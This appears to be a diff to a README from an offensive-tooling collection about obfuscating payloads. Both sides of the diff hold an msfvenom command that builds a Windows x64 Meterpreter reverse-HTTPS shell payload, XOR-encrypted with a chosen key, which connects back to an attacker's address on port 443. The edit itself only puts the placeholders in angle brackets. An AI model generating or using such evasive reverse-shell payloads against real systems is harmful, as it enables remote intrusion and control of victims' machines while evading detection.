@@ -4,7 +4,7 @@ Some Usefull tools and specific modus operanti to obfuscate payload
 ### Payload generation
 
 ```sh
-msfvenom -p windows/x64/meterpreter_reverse_https LHOST=OurIPADRESS LPORT=443 --encrypt xor --encrypt-key helloworld --format raw > testf
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<OurIPADRESS> LPORT=443 --encrypt xor --encrypt-key <helloworld> --format raw > testf
 ```  
 helloworld are the key but we can write what we want.  
 
